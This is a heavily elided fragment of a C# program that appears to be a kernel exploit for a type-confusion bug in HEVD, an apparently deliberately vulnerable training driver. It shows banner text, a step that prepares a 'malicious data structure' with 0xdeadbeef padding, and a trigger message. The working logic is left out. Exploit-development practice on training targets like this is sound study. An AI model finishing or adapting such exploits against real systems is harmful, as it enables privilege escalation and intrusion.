...
namespace TypeConfusion
{
    class Program
    {
        ...
        static void Main()
        {
            ...
            Console.WriteLine("--[ HEVD Exploitation : Type Confusion\n");
            ...
            // Step 2: Prepare malicious data structure
            byte[] padding = BitConverter.GetBytes((uint)0xdeadbeef);
            ...
            Console.WriteLine("[>] Triggering type confusion");
